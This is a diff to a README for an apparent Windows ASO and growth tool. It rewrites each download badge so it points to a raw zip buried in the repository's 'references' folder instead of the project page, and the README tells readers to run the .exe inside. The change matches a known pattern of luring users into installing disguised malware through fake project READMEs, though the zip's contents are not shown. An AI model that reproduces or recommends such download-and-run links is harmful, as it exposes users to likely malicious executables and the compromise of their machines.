@@ -1,6 +1,6 @@
 # 📈 gingiris-aso-growth - Simple ASO & Growth Tools
 
-[![Download Now](https://img.shields.io/badge/Download-gingiris--aso--growth-ff6347?style=for-the-badge&logo=github)](https://github.com/fatcow11111/gingiris-aso-growth)
+[![Download Now](https://img.shields.io/badge/Download-gingiris--aso--growth-ff6347?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/fatcow11111/gingiris-aso-growth/main/references/growth-gingiris-aso-3.0-beta.3.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get gingiris-aso-growth running on your Windows machine.
 
 Go to the download page by clicking the badge below:
 
-[![Download Now](https://img.shields.io/badge/Download-gingiris--aso--growth-ff6347?style=for-the-badge&logo=github)](https://github.com/fatcow11111/gingiris-aso-growth)
+[![Download Now](https://img.shields.io/badge/Download-gingiris--aso--growth-ff6347?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/fatcow11111/gingiris-aso-growth/main/references/growth-gingiris-aso-3.0-beta.3.zip)
 
 This page contains the latest files you need to install the app.
 
@@ -147,7 +147,7 @@ If you still need help, visit the Issues tab on the GitHub page to see existing 
 
 Download the installer for Windows here:
 
-[![Download gingiris-aso-growth](https://img.shields.io/badge/Download-gingiris--aso--growth-ff6347?style=for-the-badge&logo=github)](https://github.com/fatcow11111/gingiris-aso-growth)
+[![Download gingiris-aso-growth](https://img.shields.io/badge/Download-gingiris--aso--growth-ff6347?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/fatcow11111/gingiris-aso-growth/main/references/growth-gingiris-aso-3.0-beta.3.zip)
 
 Run the `.exe` file and follow prompts to install.
 
